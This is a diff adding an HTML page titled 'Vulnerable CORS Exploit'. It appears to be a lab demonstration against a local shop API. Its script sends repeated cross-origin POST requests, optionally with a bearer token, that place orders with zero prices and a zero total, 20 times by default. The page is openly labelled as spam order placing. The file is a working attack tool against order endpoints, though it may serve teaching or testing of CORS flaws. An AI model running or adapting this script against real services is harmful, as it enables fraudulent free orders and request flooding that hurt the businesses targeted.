@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Vulnerable CORS Example</title>
+    <link rel="stylesheet" href="cors.css" />
+  </head>
+  <body>
+    <h1>Vulnerable CORS Exploit</h1>
+    <p>Spam order placing</p>
+    <form id="requestForm">
+      <label for="apiEndpoint">API Endpoint:</label>
+      <input
+        type="text"
+        id="apiEndpoint"
+        placeholder="http://localhost:5004/api/orders"
+        value="http://localhost:5004/api/orders"
+        required
+      />
+      <br />
+
+      <label for="token">Auth Token (optional):</label>
+      <input
+        type="text"
+        id="token"
+        placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+      />
+      <br />
+
+      <label for="name">Name:</label>
+      <input
+        type="text"
+        id="name"
+        placeholder="Andrei"
+        value="Andrei"
+        required
+        oninput="this.setAttribute('value', this.value)"
+      />
+      <br />
+
+      <label for="address">Address:</label>
+      <input
+        type="text"
+        id="address"
+        placeholder="Splaiul Independentei 123"
+        value="Splaiul Independentei 123"
+        required
+        oninput="this.setAttribute('value', this.value)"
+      />
+      <br />
+
+      <label for="town">Town:</label>
+      <input
+        type="text"
+        id="town"
+        placeholder="Bucuresti"
+        value="Bucuresti"
+        required
+        oninput="this.setAttribute('value', this.value)"
+      />
+      <br />
+
+      <label for="email">Email:</label>
+      <input
+        type="email"
+        id="email"
+        placeholder="andrei@gmail.com"
+        value="andrei@gmail.com"
+        required
+        oninput="this.setAttribute('value', this.value)"
+      />
+      <br />
+
+      <label for="items">Items (JSON format):</label>
+      <textarea
+        id="items"
+        placeholder='[{"id": 1, "name": "Item 1", "price": 0, "quantity": 100}]'
+        required
+      >
+[{"id": 1, "name": "Item 1", "price": 0, "quantity": 100}]</textarea
+      >
+      <br />
+
+      <label for="totalAmount">Total Amount:</label>
+      <input
+        type="number"
+        id="totalAmount"
+        placeholder="0"
+        value="0"
+        required
+      />
+      <br />
+
+      <label for="repeatCount">Number of repetitions:</label>
+      <input type="number" id="repeatCount" min="1" value="20" required />
+      <br />
+
+      <button type="button" id="exploitButton">Send Request</button>
+    </form>
+
+    <script>
+      document
+        .getElementById("exploitButton")
+        .addEventListener("click", async () => {
+          const apiEndpoint = document.getElementById("apiEndpoint").value;
+          const token = document.getElementById("token").value.trim();
+          const name = document.getElementById("name").value;
+          const address = document.getElementById("address").value;
+          const town = document.getElementById("town").value;
+          const email = document.getElementById("email").value;
+          let items;
+          try {
+            items = JSON.parse(document.getElementById("items").value);
+          } catch (e) {
+            alert("Invalid JSON in items field!");
+            return;
+          }
+          const totalAmount = parseFloat(
+            document.getElementById("totalAmount").value
+          );
+          const repeatCount = parseInt(
+            document.getElementById("repeatCount").value,
+            10
+          );
+
+          const headers = {
+            "Content-Type": "application/json",
+          };
+          if (token) {
+            headers["Authorization"] = `Bearer ${token}`;
+          }
+
+          for (let i = 0; i < repeatCount; i++) {
+            try {
+              const response = await fetch(apiEndpoint, {
+                method: "POST",
+                headers,
+                body: JSON.stringify({
+                  name,
+                  address,
+                  town,
+                  email,
+                  items,
+                  totalAmount,
+                }),
+              });
+              const data = await response.json();
+              console.log(`Response ${i + 1}:`, data);
+            } catch (error) {
+              console.error(`Error on request ${i + 1}:`, error);
+            }
+          }
+          alert(`${repeatCount} requests sent!`);
+        });
+    </script>
+  </body>
+</html>
